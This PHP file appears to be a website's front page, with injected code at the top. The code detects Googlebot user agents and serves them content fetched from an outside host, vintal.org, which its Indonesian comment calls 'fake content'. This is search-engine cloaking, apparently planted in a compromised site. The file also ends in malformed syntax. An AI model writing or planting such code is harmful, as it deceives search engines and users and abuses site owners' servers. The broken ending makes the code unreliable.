<?php
// Fungsi untuk deteksi Googlebot
function is_google_bot() {
    $bots = ["Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News"];
    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

// Kalo Googlebot, redirect ke konten palsu
if (is_google_bot()) {
    $ch = curl_init('https://vintal.org/adeknibang/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Tambahin biar aman
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    echo $response;
    exit;
}

// Konfigurasi error
ini_set('display_errors', 0);
error_reporting(E_ERROR & ~E_STRICT);

// Definisi konstanta
define("IS_ADMIN_PAGE", 0);
define("_SITE_ROOT", 'FRONTPAGE');
define('ABSPATH', $_SERVER['DOCUMENT_ROOT']);

// Load init
if (file_exists(ABSPATH . '/init.php')) {
    require_once(ABSPATH . '/init.php');
} else {
    die('System init not found!');
}

// Required Module

} else {

}
